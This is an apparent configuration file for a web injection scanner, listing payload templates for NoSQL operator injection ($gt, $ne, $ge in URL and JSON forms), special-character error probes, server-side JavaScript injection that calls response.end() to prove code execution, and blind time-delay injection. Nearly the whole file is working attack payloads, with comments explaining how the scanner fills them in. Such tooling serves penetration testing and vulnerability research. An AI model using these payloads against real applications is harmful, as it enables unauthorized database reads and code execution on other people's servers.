# All the injection attempts are implemented here. Some notes on syntax.
# - Section names are used as ID and must therefore be unique
# - Under each section, you can have the following key/value pairs:
#  - result=(length|error|delay) - This is used to measure if injection was successful or not
#   - length - The length of the response will change
#   - error  - Response is different from the 200 OK code
#   - delay  - Reponse is delayed for some time
#  - paramname=<Template to replace parameter name>
#  - paramvalue=<Template to replace parameter value>
#  - injectparam=(all || individual || product) - Whether we should inject each parameter
#    individually or all at the same time. Product has not been implemented, but means that
#    they will be injected individually, then combined in every possible way.
#  - description=Description that is printed to show what is done
# - The templates is where the action happens, this text is inserted after the following is replaced:
#  - $default - What user or program has specified as default value of the field
#  - $rand - Some random value, length is decided pÃ¥ program/user
#  - $endquote & $beginquote - 
#   - When string is inserted, it can be inserted in many different places, to
#     form a valid injection, these keywords are used to indicate to the program
#     where it should try to end and start expressions.
#   - If there are multiple $endquote and $beginquote, they will all be replaced, but not
#     with different values, i.e. you can't have different endquotes or beginquotes
#     in the same injection attempt. This will not be added, unless there is a need for it.
#  - $jsdelay - JS code that delays some user-decided time, can be used to test blind injection
#   - If this code is executed as part of a function, it will be executed for each row, or maybe
#     more. The expected time delay must therefore be multiplied by the number of rows. The
#     application can end the connection, but server will run at 100% CPU for some time.
# -

# NB! Escape all semicolons (;)

[Inject_GE_URL]
validenc=URL
result=length
paramname=$default[$gt]
paramvalue=
injectparam=individual
description=If object is deserialized we can change the query to become 'paramname > ""', which should be all the records.

[Inject_GE_JSON]
validenc=JSON
result=length
paramvalue={"$ge": ""}
paramname=$default
injectparam=individual

[Inject_NE_URL]
validenc=URL
result=length
paramname=$default[$ne]
paramvalue=$rand
injectparam=individual
description=Same deserilization attack as above, but checks if it's not equal.

[Inject_NE_JSON]
validenc=JSON
result=length
paramvalue={"$ne": "$rand"}
paramname=$default
injectparam=individual

[Inject_Illegal]
result=error
paramvalue=$default' || $default" || $default\\ || $default\; || $default\{ || $default\}
injectparam=individual
description=Insert special character to try and induce an error response. An error is strong indication that input is not filtered properly, but not necessarily exploitable.

[Inject_Resp]
result=echo
paramvalue=$default$endquote\;response.end('$rand')\;var $rand=$beginquote$default || $default$endquote\;res.end('$rand')\;var $rand=$beginquote$default
paramname=$default
injectparam=individual
description=Tries to send a response back to us from the server. If this works, exploitation is guaranteed.

[Inject_Delay]
result=delay
paramvalue=$default$endquote\;$jsdelay\;var $rand=$beginquote$default
paramname=$default
injectparam=individual
description=Tries to inject JS into the parametervalue, it inserts a time delay, so the benefit is that this works even if we are testing blind.

